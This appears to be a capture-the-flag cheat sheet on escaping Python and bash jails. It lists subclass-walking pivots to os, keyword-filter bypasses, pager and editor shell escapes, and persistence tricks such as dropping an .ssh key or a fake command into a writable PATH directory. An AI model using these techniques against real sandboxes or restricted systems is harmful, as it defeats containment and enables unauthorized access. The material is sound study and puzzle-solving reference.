# Restricted interpreter escape: find what's left

A pyjail/bash-jail removes the obvious names — `eval`, `exec`, `system`,
`import`, `__builtins__` — and the escape is always something the filter
forgot. Enumerate what *is* reachable before reaching for a trick.

## The inventory first

```python
>>> dir()                     # what names exist
>>> __builtins__              # if dict: keys are the allowed set
>>> help()                    # sometimes readable
```

What survived is the attack surface — a builtin that was left, an object
method that reaches `__class__`, a dunder the filter didn't think about.

## The pyjail alphabet

| Reachable | Reach |
|---|---|
| `().__class__.__base__.__subclasses__()` | every live class — `<os._wrap_close>` etc. reach `os` |
| `__builtins__` dict | `eval`, `exec`, `open`, `__import__` |
| `getattr`, `__import__` | the imports the filter tried to hide |
| `globals()`, `locals()` | the namespace — often holds `flag` or a helper |
| `__class__` on any object | walk to `__subclasses__`, `__globals__`, `__mro__` |
| `str.format`/f-string attrs | `"{x.__init__.__globals__}"` |
| `help()`, `license`, `copyright` | objects with methods — `help(os)` etc. |
| `print`, `repr`, `format` | dunders on the result |

The universal pivot: `().__class__.__base__.__subclasses__()` — from any
object, walk to `object`, list every subclass, find one with `os` in its
globals (`subprocess.Popen`, `os._wrap_close`, `warnings.catch_warnings`).

## Bash/jail escapes

| Allowed | Escape |
|---|---|
| `ls`, `cat`, `more`, `less` | `!/bin/sh` inside the pager |
| `find`, `awk`, `vi`, `ed` | `-exec`, `system()`, `:shell` |
| `python`, `perl`, `ruby` interpreter | spawn a shell from inside |
| `cp`, `mv`, `tar` | overwrite a config or drop a `.ssh/` key |
| `sudo -l` shows one allowed cmd | that cmd's own escape — GTFOBins |
| `$PATH` contains a writable dir | drop a fake common command |

`GTFOBins` is the canonical lookup for "allowed command → escape".

## Filter bypasses for the names themselves

| Filtered | Bypass |
|---|---|
| `eval` blocked | `getattr(__builtins__, 'ev'+'al')` or `().__class__.__base__.__subclasses__()` |
| `import` blocked | `__import__`, `getattr` on a loaded module, `sys.modules` walk |
| `system` blocked | `os.popen`, `subprocess`, `commands`, `os.spawnl` |
| `open` blocked | `io.open`, `file()` (py2), `os.read` on a fd |
| keyword blacklist | `exec("ev"+"al")`, `getattr(*['ev','al'])`, `__builtins__['eval']` |

## Falsifier

Every object path is genuinely closed — `__builtins__` is empty, all classes
are leaf, no module is reachable, no filesystem command exists. The jail is
real; the flag is in the puzzle the jail wraps, not outside it.

## Traps

- A filtered *keyword* is not the same as a filtered *capability* —
  `eval` removed but `getattr` left is still an open jail.
- `__subclasses__()` order isn't stable — index by name, not position.
- Bash jail "allowlisted commands" often include pagers/editors that are
  themselves shell escapes — `more`/`less`/`vi` are not read-only.
- `help()` and `license` are objects, not strings — their methods reach
  further than the filter expects.
